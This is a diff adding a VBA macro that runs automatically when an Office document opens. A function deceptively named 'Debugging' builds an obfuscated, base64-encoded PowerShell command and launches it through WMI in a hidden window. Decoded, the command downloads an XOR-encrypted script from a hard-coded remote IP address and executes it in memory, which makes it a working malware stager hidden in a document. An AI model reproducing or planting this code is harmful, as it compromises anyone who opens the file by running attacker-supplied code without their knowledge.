@@ -1,0 +1,47 @@
+Sub AutoOpen()
+	Debugging
+End Sub
+
+Sub Document_Open()
+	Debugging
+End Sub
+
+Public Function Debugging() As Variant
+	Dim Str As String
+	str = "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBT"
+	str = str + "AHkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAHIAVgBJAGMAZQBQAE"
+	str = str + "8ASQBuAFQATQBhAE4AYQBnAEUAcgBdADoAOgBFAHgAcABFAGMA"
+	str = str + "VAAxADAAMABDAE8AbgBUAEkATgBVAGUAIAA9ACAAMAA7ACQAdw"
+	str = str + "BjAD0ATgBFAHcALQBPAEIAagBlAEMAVAAgAFMAWQBTAFQAZQBt"
+	str = str + "AC4ATgBFAFQALgBXAGUAYgBDAEwASQBlAE4AVAA7ACQAdQA9AC"
+	str = str + "cATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8A"
+	str = str + "dwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVA"
+	str = str + "ByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAw"
+	str = str + "ACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAQwAuAE"
+	str = str + "gARQBhAEQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEA"
+	str = str + "ZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAcgBPAFgAeQ"
+	str = str + "AgAD0AIABbAFMAeQBzAFQAZQBNAC4ATgBFAHQALgBXAGUAQgBS"
+	str = str + "AGUAcQB1AGUAcwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBlAG"
+	str = str + "IAUABSAE8AeAB5ADsAJAB3AGMALgBQAHIAbwBYAFkALgBDAHIA"
+	str = str + "RQBEAGUAbgBUAGkAQQBsAFMAIAA9ACAAWwBTAHkAcwBUAEUATQ"
+	str = str + "AuAE4ARQBUAC4AQwByAGUAZABFAG4AdABpAEEATABDAGEAQwBo"
+	str = str + "AEUAXQA6ADoARABlAGYAQQBVAEwAdABOAGUAVAB3AG8AcgBLAE"
+	str = str + "MAcgBFAGQARQBuAHQASQBBAGwAUwA7ACQASwA9ACcAWwBZAE0A"
+	str = str + "PgBfACsARwAoAFQASQAlAE8ANgA/AHwAaQAqADkAXAB4AC0AWg"
+	str = str + "BLAHsAcgAyACQAMwBdAFMASgA4ACcAOwAkAGkAPQAwADsAWwBD"
+	str = str + "AGgAYQByAFsAXQBdACQAQgA9ACgAWwBjAGgAYQByAFsAXQBdAC"
+	str = str + "gAJABXAGMALgBEAE8AVwBuAGwATwBhAGQAUwB0AFIASQBuAGcA"
+	str = str + "KAAiAGgAdAB0AHAAOgAvAC8ANAA2AC4AMQAwADEALgAxADEAMg"
+	str = str + "AuADEANAA0ADoAOAAwADgAMAAvAGkAbgBkAGUAeAAuAGEAcwBw"
+	str = str + "ACIAKQApACkAfAAlAHsAJABfAC0AYgBYAE8AUgAkAGsAWwAkAE"
+	str = str + "kAKwArACUAJABLAC4ATABFAE4ARwB0AEgAXQB9ADsASQBFAFgA"
+	str = str + "IAAoACQAQgAtAGoATwBJAE4AJwAnACkA"
+	Const HIDDEN_WINDOW = 0
+	strComputer = "."
+	Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+	Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+	Set objConfig = objStartup.SpawnInstance_
+	objConfig.ShowWindow = HIDDEN_WINDOW
+	Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+	objProcess.Create str, Null, objConfig, intProcessID
+End Function
